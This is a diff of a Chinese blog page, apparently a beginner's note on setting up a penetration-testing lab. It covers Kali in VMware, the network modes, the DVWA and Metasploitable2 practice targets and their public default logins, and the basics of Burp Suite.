-<p>####渗透测试一般在虚拟机上环境下比较方便（百度上有各种各样的教程这里就不过多赘述了）<br><a href="https://baijiahao.baidu.com/s?id=1610754152224855428&amp;wfr=spider&amp;for=pc" target="_blank" rel="noopener">这里插一个我当初安装kali时用的教程</a><br>kali的账户默认为root  密码默认为toor<br>然后讲一讲安装好后的配置问题：<br>VMware 提供了三种网络工作模式 （解决虚拟机网络联通的问题）<br>·Bridged 桥接模式：虚拟机和实体机在同一网段IP相同<br>·NAT 网络地址转换模式：虚拟机通过实体机来上网<br>·Host_Only 仅主机模式：只能和实体机通讯无法上网<br>VMware workstation 还提供了虚拟机快照的功能“位于顶部文件那一栏”<br>对虚拟机的运行状态进行快照，（包括正在安装的软件，和进程）以便恢复之前的状态。<br>（建议在第一次配置好后拍一张快照储存当初始化用）</p>
+<h4 id="渗透测试一般在虚拟机上环境下比较方便（百度上有各种各样的教程这里就不过多赘述了）"><a href="#渗透测试一般在虚拟机上环境下比较方便（百度上有各种各样的教程这里就不过多赘述了）" class="headerlink" title="渗透测试一般在虚拟机上环境下比较方便（百度上有各种各样的教程这里就不过多赘述了）"></a>渗透测试一般在虚拟机上环境下比较方便（百度上有各种各样的教程这里就不过多赘述了）</h4><p><a href="https://baijiahao.baidu.com/s?id=1610754152224855428&amp;wfr=spider&amp;for=pc" target="_blank" rel="noopener">这里插一个我当初安装kali时用的教程</a><br>kali的账户默认为root  密码默认为toor<br>然后讲一讲安装好后的配置问题：<br>VMware 提供了三种网络工作模式 （解决虚拟机网络联通的问题）<br>·Bridged 桥接模式：虚拟机和实体机在同一网段IP相同<br>·NAT 网络地址转换模式：虚拟机通过实体机来上网<br>·Host_Only 仅主机模式：只能和实体机通讯无法上网<br>VMware workstation 还提供了虚拟机快照的功能“位于顶部文件那一栏”<br>对虚拟机的运行状态进行快照，（包括正在安装的软件，和进程）以便恢复之前的状态。<br>（建议在第一次配置好后拍一张快照储存当初始化用）</p>
 <hr>
-<p>####然后来讲一下网站的搭建<br>网站由中间件、网站程序、数据库等程序组成。<br>常见的中间件大致就是Apache、Ninx、IIS这三种然后由 PHP、JSP、ASP等web语言编写，数据库则mysql是目前最火的数据库<br>我们搭建网站时可以独立安装每一个组建，也有一键建站的集成功能。当然，各有好处<br>常见的集成环境：·phpStudy ·XAMPP ·Wamp Server<br>DVWA时开源的漏洞靶场功能强大，学习适合可以参照<a href="https://jingyan.baidu.com/article/a3a3f81117e5f18da2eb8a09.html" target="_blank" rel="noopener">百度上的教程</a><br>也可以安装虚拟机靶场Metasploitable2-Linux 账号密码都为msfadmin 登录后ifxonfig出ip  在浏览器输入ip就可以使用了<br>DVWA的账户默认为admin 密码是password。</p>
+<h4 id="然后来讲一下网站的搭建"><a href="#然后来讲一下网站的搭建" class="headerlink" title="然后来讲一下网站的搭建"></a>然后来讲一下网站的搭建</h4><p>网站由中间件、网站程序、数据库等程序组成。<br>常见的中间件大致就是Apache、Ninx、IIS这三种然后由 PHP、JSP、ASP等web语言编写，数据库则mysql是目前最火的数据库<br>我们搭建网站时可以独立安装每一个组建，也有一键建站的集成功能。当然，各有好处<br>常见的集成环境：·phpStudy ·XAMPP ·Wamp Server<br>DVWA时开源的漏洞靶场功能强大，学习适合可以参照<a href="https://jingyan.baidu.com/article/a3a3f81117e5f18da2eb8a09.html" target="_blank" rel="noopener">百度上的教程</a><br>也可以安装虚拟机靶场Metasploitable2-Linux 账号密码都为msfadmin 登录后ifxonfig出ip  在浏览器输入ip就可以使用了<br>DVWA的账户默认为admin 密码是password。</p>
 <hr>
-<p>####Burpsuit基础<br>burpsuit是用于攻击web的集成平台。包含许多工具所有工具都共享一个能处理并显示HTTP消息，持久性，认证，代理日志警报的一个强大的可扩展框架<br>所有功能的核心都是HTTP代理对HTTP流量分析方便挖掘web漏洞<br>顺便体一句HTTP代理：<br>HTTP代理位于浏览器和web服务器之间<br>可以分析浏览器和服务器之间的通信数据 ，测试web漏洞如SQl注入，文件上传，弱口令等</p>
+<h4 id="Burpsuit基础"><a href="#Burpsuit基础" class="headerlink" title="Burpsuit基础"></a>Burpsuit基础</h4><p>burpsuit是用于攻击web的集成平台。包含许多工具所有工具都共享一个能处理并显示HTTP消息，持久性，认证，代理日志警报的一个强大的可扩展框架<br>所有功能的核心都是HTTP代理对HTTP流量分析方便挖掘web漏洞<br>顺便体一句HTTP代理：<br>HTTP代理位于浏览器和web服务器之间<br>可以分析浏览器和服务器之间的通信数据 ，测试web漏洞如SQl注入，文件上传，弱口令等</p>
 <hr>
 <p><em>这篇算是测试了看一看写出来的效果如何后面在做调整</em></p>
 
@@ -563,7 +556,7 @@ mysql udf提权
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/03/17/hello-world/" data-id="cjtgrssb50006hwuk3bs2kbnd" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/03/17/hello-world/" data-id="cjth476hr00016wuks0ft112t" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
